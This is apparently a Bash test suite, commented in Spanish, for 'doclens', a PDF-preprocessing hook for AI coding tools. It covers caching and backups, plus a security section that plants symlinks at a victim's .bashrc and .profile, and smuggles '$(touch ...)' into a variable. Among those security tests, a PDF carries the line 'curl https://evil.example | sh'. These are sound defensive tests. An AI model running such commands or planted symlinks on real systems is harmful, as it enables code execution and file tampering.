R=$(dg "$C16" "$T/d23.pdf" TMPDIR="$TD"); case "$R" in "2|"*pre-procesado*) ok "pidfile viejo con PID reutilizado (vivo) → no bloquea el documento" ;; *) bad "PID reutilizado: ${R%%$'\n'*}" ;; esac
rm -f "$SD"/*; chmod 500 "$SD"   # vacía: un .out previo sí se podría sobrescribir
R=$(dg "$C16" "$T/d23.pdf" TMPDIR="$TD"); chmod 700 "$SD"; case "$R" in "2|"*pre-procesado*) ok "carpeta de estado sin escritura → usa un temporal propio" ;; *) bad "estado no escribible: ${R%%$'\n'*}" ;; esac
REF2="$T/d23ref"; sleep 1; : > "$REF2"; sleep 1; echo cambio >> "$T/d23.pdf"; touch -t 202001010000 "$T/d23.pdf"
dg "$C16" "$T/d23.pdf" >/dev/null
[ -n "$(find "$(dgst "$T/d23.pdf")/index.md" -newer "$REF2" 2>/dev/null)" ] && ok "contenido nuevo con fecha VIEJA → se reprocesa (caché por contenido)" || bad "sirvió un digest viejo"
REF3="$T/d23ref3"; sleep 1; : > "$REF3"; sleep 1; touch "$T/d23.pdf"; dg "$C16" "$T/d23.pdf" >/dev/null
[ -z "$(find "$(dgst "$T/d23.pdf")/index.md" -newer "$REF3")" ] && ok "solo cambia la fecha (mismo contenido) → no reprocesa" || bad "reprocesó sin cambio de contenido"
: > "$UVLOG"; mv "$C16/doclens/.venv" "$C16/doclens/.venv-off"
R=$(dg "$C16" "$T/d23.pdf"); mv "$C16/doclens/.venv-off" "$C16/doclens/.venv"
case "$R" in "2|"*pre-procesado*) ok "digest vigente → respuesta directa, sin lanzar procesos ni venv" ;; *) bad "camino rápido: ${R%%$'\n'*}" ;; esac
TD2="$T/tmpd2"; mkdir -p "$TD2"
R=$(dg "$C16" "$T/notas.md" TMPDIR="$TD2" | cut -d'|' -f1)
eq "Read de un .md → exit 0" "$R" 0
[ ! -e "$TD2/doclens-hook-$(id -u)" ] && ok "lo que no es PDF sale antes de cualquier preparación" || bad "preparó estado para un .md"
ms() { python3 -c 'import time; print(int(time.time() * 1000))'; }
S0=$(ms); for i in 1 2 3 4 5; do dg "$C16" "$T/d23.pdf" TMPDIR="$TD" >/dev/null; done
echo "  - informativo: Read de PDF ya procesado ≈ $(( ($(ms) - S0) / 5 )) ms (depende de la máquina; no se asserta)"
printf 'x\n' > "$TB/doclens/adapters/a\\b \"c\"\td.txt"; (cd "$TB" && g add -A && g commit -qm raro) >/dev/null
C17=$(consumer); stubvenv "$C17/doclens/.venv"; bash "$SYNC" "$C17" >/dev/null 2>&1; RC=$?
eq "nombre con \\, comillas y tab en el toolbox → exit 0" "$RC" 0
[ -f "$C17/doclens/adapters/a\\b \"c\"\td.txt" ] && [ -f "$C17/doclens/doclens.py" ] && ok "se copia (y el resto también)" || bad "nombre raro: $(ls "$C17/doclens/adapters" | tr '\n' ',')"
has "--check → al día con nombre raro" "$(bash "$SYNC" "$C17" --check)" "doclens al día"
(cd "$TB" && g rm -q "doclens/adapters/a\\b \"c\"\td.txt" && g commit -qm quita) >/dev/null
C18=$(consumer); OUT=$(cd "$C18" && bash "$SYNC" "" --check 2>&1)
case "$OUT" in "update disponible"*) ok "sync.sh \"\" --check → solo reporta" ;; *) bad "primer arg vacío: [$OUT]" ;; esac
[ ! -e "$C18/doclens" ] && ok "y no copia nada" || bad "copió con --check"
OUT=$(env DOCLENS_PYTHON=python3-no-existe PATH="$UVPATH" bash "$SYNC" "$C16" 2>&1); RC=$?
eq "DOCLENS_PYTHON inexistente → no falla (usa el venv)" "$RC" 0

echo "══ D24: validación final — proceso largo, respaldos, motor real ══"
C19=$(consumer); stubvenv "$C19/doclens/.venv"; bash "$SYNC" "$C19" >/dev/null 2>&1; echo "d24.pdf" > "$T/d24.pdf"
TD3="$T/tmpd3"; mkdir -p "$TD3"; mkdir -m 700 "$TD3/doclens-hook-$(id -u)"; KEY=$(printf '%s' "$T/d24.pdf" | cksum | cut -d' ' -f1)
sh -c ': doclens-bg; sleep 30; :' doclens-bg & BG=$!   # compuesto: sh no hace exec directo a sleep
echo "$BG $(( $(date +%s) - 4000 ))" > "$TD3/doclens-hook-$(id -u)/$KEY.pid"
R=$(dg "$C19" "$T/d24.pdf" TMPDIR="$TD3"); case "$R" in "2|"*"probablemente está colgado"*) ok "proceso nuestro > 1 h → 'colgado' + ruta manual (sin bucle de reintentos)" ;; *) bad "colgado: ${R%%$'\n'*}" ;; esac
echo "$BG $(( $(date +%s) - 95 ))" > "$TD3/doclens-hook-$(id -u)/$KEY.pid"
R=$(dg "$C19" "$T/d24.pdf" TMPDIR="$TD3"); case "$R" in "2|"*"lleva 1 min 3"*) ok "en curso → dice cuánto lleva" ;; *) bad "en curso: ${R%%$'\n'*}" ;; esac
kill "$BG" 2>/dev/null; wait "$BG" 2>/dev/null
CB2=$(consumer); bash "$SYNC" "$CB2" >/dev/null 2>&1; (cd "$CB2" && g add -A && g commit -qm doclens) >/dev/null
echo "// v2" >> "$TB/doclens/adapters/opencode/doclens-tool.ts"; (cd "$TB" && g commit -qam v2) >/dev/null
OUT=$(bash "$SYNC" "$CB2" 2>&1)
[ -z "$(ls -d "$CB2"/.claude/.harness-backup-*-doclens 2>/dev/null)" ] && ok "lo commiteado sin cambios no se respalda (git lo recupera)" || bad "respaldó contenido commiteado"
has "indica commitear doclens/" "$OUT" "cambios sin commitear"
echo local >> "$CB2/doclens/README.md"; echo "// v3" >> "$TB/doclens/adapters/opencode/doclens-tool.ts"; (cd "$TB" && g commit -qam v3) >/dev/null
bash "$SYNC" "$CB2" >/dev/null 2>&1
ls "$CB2"/.claude/.harness-backup-*-doclens/doclens/README.md >/dev/null 2>&1 && ok "un cambio local sí se respalda" || bad "perdió un cambio local sin respaldo"
RP="$AI_TOOLING/doclens/.venv/bin/python"
if $REAL; then
  C20=$(consumer); bash "$SYNC" "$C20" --check >/dev/null; env DOCLENS_PYTHON="$RP" bash "$SYNC" "$C20" >/dev/null 2>&1
  mkpdf() { "$RP" -c "import fitz,sys; d=fitz.open(); [d.new_page().insert_text((72,72),sys.argv[2]) for _ in range(int(sys.argv[3]))]; d.save(sys.argv[1])" "$1" "$2" "$3"; }
  mkpdf "$T/v.pdf" "VERSION DOS" 3; dg "$C20" "$T/v.pdf" DOCLENS_PYTHON="$RP" >/dev/null
  mkpdf "$T/v-new.pdf" "VERSION TRES" 1; touch -t 202001010000 "$T/v-new.pdf"; mv "$T/v-new.pdf" "$T/v.pdf"
  dg "$C20" "$T/v.pdf" DOCLENS_PYTHON="$RP" >/dev/null
  [ "$(grep -c 'VERSION TRES' "$(dgst "$T/v.pdf")/index.md")" -ge 1 ] && ok "motor real: PDF reemplazado con fecha vieja → digest nuevo" || bad "motor real sirvió el digest viejo"
  [ ! -e "$(dgst "$T/v.pdf")/pages/page-2.png" ] && ok "motor real: páginas que ya no existen se borran" || bad "quedaron pages/ viejas"
  "$RP" -c "from PIL import Image; Image.new('RGB',(40,40),'red').save('$T/img.pdf', format='PNG')"
  R=$(dg "$C20" "$T/img.pdf" DOCLENS_PYTHON="$RP"); case "$R" in "2|"*"es en realidad una imagen"*as-image.png*) ok "imagen con extensión .pdf → apunta a as-image.png" ;; *) bad "imagen .pdf: ${R%%$'\n'*}" ;; esac
  [ -f "$(dgst "$T/img.pdf")/as-image.png" ] && ok "as-image.png existe" || bad "sin as-image.png"
  "$RP" -c "import fitz; d=fitz.open(); d.new_page().insert_text((72,72),'x'); d.save('$T/pw.pdf', encryption=fitz.PDF_ENCRYPT_AES_256, user_pw='u', owner_pw='o')"
  R=$(dg "$C20" "$T/pw.pdf" DOCLENS_PYTHON="$RP"); case "$R" in "2|"*"contraseña de apertura"*) ok "PDF con contraseña → mensaje claro" ;; *) bad "contraseña: ${R%%$'\n'*}" ;; esac
  dd if=/dev/urandom of="$T/roto.png" bs=1048576 count=9 2>/dev/null
  R=$(dg "$C20" "$T/roto.png" DOCLENS_PYTHON="$RP"); case "$R" in "2|"*"no pudo abrir"*) ok "imagen grande corrupta → se bloquea con motivo" ;; *) bad "imagen corrupta: ${R%%|*}" ;; esac
else
  echo "  - omitido: sin doclens/.venv real (motor real)"
fi

echo "══ D25: seguridad (ADR-0077) — ataques del reporte ══"
TD4="$T/tmpd4"; mkdir -p "$TD4/doclens-hook-$(id -u)"; chmod 755 "$TD4/doclens-hook-$(id -u)"; echo d25 > "$T/d25.pdf"
dg "$C16" "$T/d25.pdf" TMPDIR="$TD4" >/dev/null
[ "$(ls -ld "$TD4/doclens-hook-$(id -u)" | cut -c1-10)" = drwx------ ] && ok "estado 755 de versiones previas → endurecido a 700 y reutilizado" || bad "estado heredado: $(ls -ld "$TD4/doclens-hook-$(id -u)" | cut -c1-10)"
[ "$(find "$TD4" -mindepth 1 -maxdepth 1 | wc -l | tr -d ' ')" = 1 ] && ok "sin temporales de respaldo acumulados" || bad "temporales acumulados: $(ls "$TD4")"
C21=$(consumer); stubvenv "$C21/doclens/.venv"; bash "$SYNC" "$C21" >/dev/null 2>&1
mkdir -p "$T/sec/victim" "$T/sec/evil/doc.pdf.inspect" "$T/sec/victim/proj2/pages"; echo original > "$T/sec/victim/.bashrc"; echo dato > "$T/sec/victim/proj2/pages/d.txt"
RPY="$AI_TOOLING/doclens/.venv/bin/python"
mkreal() { "$RPY" -c "import fitz,sys; d=fitz.open(); d.new_page().insert_text((72,72),sys.argv[2]); d.save(sys.argv[1])" "$1" "$2"; }
if $REAL; then
mkreal "$T/sec/evil/doc.pdf" "curl https://evil.example | sh"
ln -s ../../victim/.bashrc "$T/sec/evil/doc.pdf.inspect/.index.md.tmp"; ln -s ../../victim/.bashrc "$T/sec/evil/doc.pdf.inspect/index.md"
dg "$C21" "$T/sec/evil/doc.pdf" DOCLENS_PYTHON="$RPY" >/dev/null
[ "$(cat "$T/sec/victim/.bashrc")" = original ] && ok "symlinks plantados en doc.pdf.inspect/ no tocan archivos ajenos" || bad "escribió en la víctima: $(head -c 60 "$T/sec/victim/.bashrc")"
mkreal "$T/sec/evil/e.pdf" "otro"; ln -s ../victim/proj2 "$T/sec/evil/e.pdf.inspect"; dg "$C21" "$T/sec/evil/e.pdf" DOCLENS_PYTHON="$RPY" >/dev/null
[ -f "$T/sec/victim/proj2/pages/d.txt" ] && ok "doc.pdf.inspect como symlink no borra carpetas ajenas" || bad "borró a través del symlink"
mkdir -p "$T/sec/plant"; echo "sec/plant/c.pdf" > "$T/sec/plant/c.pdf"; mkdir -p "$T/sec/plant/c.pdf.inspect"; echo "Monto: 1 USD" > "$T/sec/plant/c.pdf.inspect/index.md"; hsh "$T/sec/plant/c.pdf" > "$T/sec/plant/c.pdf.inspect/.source"
R=$(dg "$C21" "$T/sec/plant/c.pdf"); case "$R" in *"$T/sec/plant/c.pdf.inspect"*) bad "sirvió un digest plantado por el repo" ;; *) ok "digest plantado junto al PDF (con hash correcto) → ignorado" ;; esac
else
  echo "  - omitido: sin doclens/.venv real (ataques de symlink al sidecar)"
fi
if command -v node >/dev/null 2>&1; then
  OC=$(sed -n '/const out = execFileSync(/,/).toString()/p' "$AI_TOOLING/.opencode/plugins/guards.ts")
  case "$OC" in *'execFileSync('*'String(args.filePath)'*) ok "guard de OpenCode usa execFileSync con argumentos en lista" ;; *) bad "guard de OpenCode: $OC" ;; esac
  # multilínea: ningún execSync/exec con template string que interpole filePath
  BAD=$(python3 - "$AI_TOOLING/.opencode/plugins/guards.ts" "$AI_TOOLING/doclens/adapters/opencode/guards-snippet.ts" <<'PY'
import re, sys
for f in sys.argv[1:]:
    src = open(f).read()
    for m in re.finditer(r"\bexec(?:Sync)?\(\s*`[^`]*\$\{[^}]*filePath", src, re.S):
        print(f"{f}:{src.count(chr(10), 0, m.start()) + 1}")
PY
)
  [ -z "$BAD" ] && ok "ningún exec/execSync con string de shell que interpole filePath" || bad "inyección posible en: $BAD"
else
  echo "  - omitido: sin node"
fi
NL="$T/sec/nl"; mkdir -p "$NL"; F=$(printf '%s/a.txt\nb.pdf' "$NL"); : > "$F"
R=$(printf '{"tool_name":"Read","tool_input":{"file_path":%s}}' "$(printf '%s' "$F" | python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))')" | (env CLAUDE_PROJECT_DIR="$C21" PATH="$UVPATH" bash "$H/doc-guard.sh" >/dev/null 2>&1; echo $?))
eq "nombre con salto de línea 'a.txt<NL>b.pdf' → interceptado" "$R" 2
mkdir -p "$T/sec/nojq" "$T/sec/sinjq"
for b in grep cat tr python3; do ln -sf "$(command -v $b)" "$T/sec/nojq/$b"; done
for d in /usr/bin /bin; do for b in "$d"/*; do n=${b##*/}; [ "$n" = jq ] || [ -e "$T/sec/sinjq/$n" ] || ln -s "$b" "$T/sec/sinjq/$n"; done; done
ln -sf "$(command -v python3)" "$T/sec/sinjq/python3"
# sin jq pero con python3 real: /usr/bin y /bin no traen jq en macOS (en Linux puede estar: entonces usa jq)
R=$(printf '%s' '{"tool_name":"Read","tool_input":{"file_path":"/x/q\"x.pdf"}}' | PATH="$T/sec/sinjq" "$BASH" "$H/doc-guard.sh" >/dev/null 2>&1; echo $?)
eq "sin jq: comilla escapada q\\\"x.pdf → bloqueado" "$R" 2
R=$(printf '%s' '{"tool_name":"Read","tool_input":{"file_path":"/x/a.\u0070df"}}' | PATH="$T/sec/sinjq" "$BASH" "$H/doc-guard.sh" >/dev/null 2>&1; echo $?)
eq "sin jq: escape \\u0070df → bloqueado" "$R" 2
rm -f "$T/sec/nojq/python3"; printf '#!/bin/sh\nexit 1\n' > "$T/sec/nojq/python3"; chmod +x "$T/sec/nojq/python3"
R=$(printf '%s' '{"tool_name":"Read","tool_input":{"file_path":"/x/a.pdf"}}' | PATH="$T/sec/nojq" "$BASH" "$H/doc-guard.sh" >/dev/null 2>&1; echo $?)
eq "sin jq y python3 roto → bloqueado (no fail-open)" "$R" 2
rm -f "$T/sec/nojq/python3"
R=$(printf '%s' '{"tool_name":"Read","tool_input":{"file_path":"/x/a.\u0070df"}}' | PATH="$T/sec/nojq" "$BASH" "$H/doc-guard.sh" >/dev/null 2>&1; echo $?)
eq "sin jq ni python3: escape → bloqueado (fail-closed)" "$R" 2
CB3="$T/sec/cache-abierto"; mkdir -m 777 "$CB3"; echo "sec/k.pdf" > "$T/sec/k.pdf"
R=$(dg "$C21" "$T/sec/k.pdf" DOCLENS_CACHE="$CB3" DOCLENS_PYTHON="$AI_TOOLING/doclens/.venv/bin/python")
if $REAL; then
  case "$R" in "2|"*"caché inseguro"*) ok "caché con permisos 0777 → rechazado (motor real)" ;; *) bad "caché 0777: ${R%%$'\n'*}" ;; esac
  ln -s "$T/sec/victim" "$T/sec/cache-link"
  R=$(dg "$C21" "$T/sec/k.pdf" DOCLENS_CACHE="$T/sec/cache-link" DOCLENS_PYTHON="$AI_TOOLING/doclens/.venv/bin/python")
  case "$R" in "2|"*"caché inseguro"*) ok "caché como symlink → rechazado" ;; *) bad "caché symlink: ${R%%$'\n'*}" ;; esac
  ln -s /dev/zero "$T/sec/z.pdf"; S0=$SECONDS
  R=$(dg "$C21" "$T/sec/z.pdf" DOCLENS_PYTHON="$AI_TOOLING/doclens/.venv/bin/python")
  case "$R" in "2|"*"no es un archivo regular"*) ok "symlink a /dev/zero → rechazado" ;; *) bad "/dev/zero: ${R%%$'\n'*}" ;; esac
  [ $((SECONDS - S0)) -le 5 ] && ! ps -axo args 2>/dev/null | grep -q "[d]oclens.py $T/sec/z.pdf" && ok "sin proceso colgado leyendo /dev/zero" || bad "proceso colgado con /dev/zero"
  "$AI_TOOLING/doclens/.venv/bin/python" -c "import fitz; d=fitz.open(); [d.new_page(width=7200, height=7200) for _ in range(3)]; d.save('$T/sec/bomba.pdf')"
  R=$(dg "$C21" "$T/sec/bomba.pdf" DOCLENS_PYTHON="$AI_TOOLING/doclens/.venv/bin/python")
  B=$(dgst "$T/sec/bomba.pdf")
  case "$R" in "2|"*pre-procesado*) PX=$("$AI_TOOLING/doclens/.venv/bin/python" -c "import fitz; p=fitz.Pixmap('$B/pages/page-1.png'); print(p.width*p.height)")
    [ "$PX" -le 40000000 ] && ok "bomba de render (7200 pt) → acotada a ≤ 40 Mpx ($PX)" || bad "render sin acotar: $PX px" ;;
    *) bad "bomba: ${R%%$'\n'*}" ;; esac
else
  echo "  - omitido: sin doclens/.venv real (caché inseguro, /dev/zero, bomba de render)"
fi
R=$(dg "$C21" "$T/d23.pdf" 'DOCLENS_HOOK_WAIT=x[$(touch '"$T/sec/WAITPWN"')]' TMPDIR="$T/sec")
[ ! -e "$T/sec/WAITPWN" ] && ok "DOCLENS_HOOK_WAIT con \$(cmd) → no ejecuta" || bad "DOCLENS_HOOK_WAIT ejecutó código"
mkdir -p "$T/sec/tmpvictim" "$T/sec/tmpd"; ln -s "$T/sec/tmpvictim" "$T/sec/tmpd/doclens-hook-$(id -u)"
echo d25b > "$T/d25b.pdf"; VKEY=$(printf '%s' "$T/d25b.pdf" | cksum | cut -d' ' -f1)
# el .out tiene nombre predecible: el código viejo lo escribía y BORRABA a través del symlink
echo valioso > "$T/sec/tmpvictim/$VKEY.out"; echo valioso > "$T/sec/tmpvictim/notas-2020.txt"; touch -t 202001010000 "$T/sec/tmpvictim/notas-2020.txt"
dg "$C21" "$T/d25b.pdf" TMPDIR="$T/sec/tmpd" >/dev/null
[ "$(cat "$T/sec/tmpvictim/$VKEY.out" 2>/dev/null)" = valioso ] && [ -f "$T/sec/tmpvictim/notas-2020.txt" ] && ok "estado del hook como symlink → no se usa (ni escribe ni purga a través de él)" || bad "tocó la víctima: [$(ls "$T/sec/tmpvictim" | tr '\n' ' ')]"
C22=$(consumer); cp -R "$TB/doclens" "$C22/doclens"; rm -rf "$C22/doclens/.venv"; echo intacto > "$T/sec/victim/.profile"
ln -s "$T/sec/victim/.profile" "$C22/doclens/.venv.failed"
printf '#!/bin/sh\nexit 1\n' > "$T/sec/failuv"; mkdir -p "$T/sec/failbin"; cp "$T/sec/failuv" "$T/sec/failbin/uv"; chmod +x "$T/sec/failbin/uv"; ln -sf "$STUB" "$T/sec/failbin/python3"
env PATH="$T/sec/failbin:$PATH" bash "$C22/doclens/sync.sh" "$C22" --force >/dev/null 2>&1
[ "$(cat "$T/sec/victim/.profile")" = intacto ] && ok ".venv.failed como symlink → la víctima queda intacta" || bad "escribió en .profile"
C23=$(consumer); bash "$SYNC" "$C23" >/dev/null 2>&1; ln -s "$T/sec/victim" "$C23/doclens/adapters/evil"
OUT=$(bash "$SYNC" "$C23" --force 2>&1); RC=$?
eq "symlink dentro de doclens/ → sync se niega (exit 3)" "$RC" 3
grep -q -- '--hash=sha256:' "$AI_TOOLING/doclens/requirements.txt" && grep -q -- '--require-hashes' "$AI_TOOLING/doclens/sync.sh" \
  && ok "requirements con hashes y sync instala con --require-hashes" || bad "dependencias sin hashes"

cleanup_bg
echo ""
echo "══ doclens: $PASS ok, $FAIL fallos ══"
rm -rf "$T"
[ "$FAIL" -eq 0 ]
